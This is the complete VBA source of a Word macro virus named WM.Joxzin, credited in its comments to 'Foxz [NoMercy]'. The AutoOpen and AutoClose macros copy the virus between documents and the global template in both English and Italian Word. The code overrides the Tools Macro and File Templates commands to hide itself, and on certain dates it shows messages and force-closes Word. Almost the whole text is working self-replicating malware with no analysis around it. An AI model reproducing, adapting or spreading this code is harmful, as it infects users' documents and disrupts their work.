   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Rem VirusName   : WM. Joxzin
   Rem Author      : Foxz [NoMercy]
   Rem Origin      : Yogyakarta, Indonesia
   Rem WordVersion : Italian and English
   Rem Dedicated to: Italian and Indonesian Macro Viruses Creator

   Public Sub MAIN()
   Dim Ver$
   Dim Nf$
   Dim CopiaMacro
   Dim DocChiudi
   Dim Fn$
   On Error GoTo -1: On Error GoTo Fuck
       'Check For Italian Word
       Ver$ = WordBasic.[AppInfo$](16)
       If Ver$ = "Italiano" Then
       WordBasic.Call "FileSalvaConNome.Formato" = 1
       Nf$ = WordBasic.Call("NomeFinestra$")
       CopiaMacro "Generale:AutoOpen", Nf$ + ":AutoOpen"
       CopiaMacro "Generale:AutoClose", Nf$ + ":AutoClose"
       CopiaMacro "Generale:NoMercyI", Nf$ + ":NoMercyI"
       CopiaMacro "Generale:NoMercyE", Nf$ + ":NoMercyE"
       DocChiudi 1
        Else
       WordBasic.FileSaveAs Format:=1
       Fn$ = WordBasic.[FileName$]()
       WordBasic.MacroCopy "Global:AutoOpen", Fn$ + ":AutoOpen"
       WordBasic.MacroCopy "Global:AutoClose", Fn$ + ":AutoClose"
       WordBasic.MacroCopy "Global:NoMercyI", Fn$ + ":NoMercyI"
       WordBasic.MacroCopy "Global:NoMercyE", Fn$ + ":NoMercyE"
       WordBasic.DocClose 1
   Fuck:
   End If
   End Sub

   Attribute VB_Name = "NoMercyI"


   Rem VirusName   : WM. Joxzin
   Rem Author      : Foxz [NoMercy]
   Rem Origin      : Yogyakarta, Indonesia
   Rem WordVersion : Italian and English
   Rem Dedicated to: Italian and Indonesian Macro Viruses Creator

   Public Sub MAIN()
   Rem Ragazzi Siete Forti
   End Sub

   Attribute VB_Name = "NoMercyE"

   Rem VirusName   : WM. Joxzin
   Rem Author      : Foxz [NoMercy]
   Rem Origin      : Yogyakarta, Indonesia
   Rem WordVersion : Italian and English
   Rem Dedicated to: Italian and Indonesian Macro Viruses Creator

   Public Sub MAIN()
   Rem You Can't Use This Man!!
   End Sub

   Attribute VB_Name = "AutoOpen"

   Rem VirusName   : WM. Joxzin
   Rem Author      : Foxz [NoMercy]
   Rem Origin      : Yogyakarta, Indonesia
   Rem WordVersion : Italian and English
   Rem Dedicated to: Italian and Indonesian Macro Viruses Creator/Collector

   Public Sub MAIN()
   Dim Ver$
   Dim Nf$
   Dim CopiaMacro
   Dim Fn$
       On Error GoTo -1: On Error GoTo Fuck
      'Check For Italian Word
       Ver$ = WordBasic.[AppInfo$](16)
       If Ver$ = "Italiano" Then
           Nf$ = WordBasic.Call("NomeFinestra$")
       CopiaMacro Nf$ + ":AutoOpen", "Generale:AutoOpen"
       CopiaMacro Nf$ + ":AutoClose", "Generale:AutoClose"
       CopiaMacro Nf$ + ":NoMercyI", "Generale:FileModelli"
       CopiaMacro Nf$ + ":NoMercyI", "Generale:StrumMacro"
       CopiaMacro Nf$ + ":NoMercyE", "Generale:NoMercyE"
       CopiaMacro Nf$ + ":NoMercyI", "Generale:NoMercyI"
       ItalianDay
        Else
       Fn$ = WordBasic.[FileName$]()
       WordBasic.MacroCopy Fn$ + ":AutoClose", "Global:AutoClose"
       WordBasic.MacroCopy Fn$ + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy Fn$ + ":NoMercyE", "Global:ToolsMacro"
       WordBasic.MacroCopy Fn$ + ":NoMercyE", "Global:FileTemplates"
       WordBasic.MacroCopy Fn$ + ":NoMercyI", "Global:NoMercyI"
       WordBasic.MacroCopy Fn$ + ":NoMercyE", "Global:NoMercyE"
       IndonesianDay
        End If
   Fuck:
   End Sub

   Private Sub ItalianDay()
   Dim TDay
   Dim TMonth
   Dim FileEsci
       TDay = WordBasic.Day(WordBasic.Now())
       TMonth = WordBasic.Month(WordBasic.Now())
       If TDay = 2 And TMonth = 6 Then
       WordBasic.MsgBox "Italia!!" + Chr(13) + "Greetz from NoMercy VirusTeam [Indonesia]", "WM.Joxzin", 48
           FileEsci 1
       Else
       GoTo Fuck
   Fuck:
   End If
   End Sub

   Private Sub IndonesianDay()
   Dim TDay
   Dim TMonth
       TDay = WordBasic.Day(WordBasic.Now())
       TMonth = WordBasic.Month(WordBasic.Now())
       If TDay = 17 And TMonth = 8 Then
           WordBasic.MsgBox "Viva Indonesia !!" + Chr(13) + "from NoMercy VirusTeam d:D", "WM.Joxzin", 48
           WordBasic.FileExit 1
       Else
       GoTo Fuck
   Fuck:
   End If
   End Sub
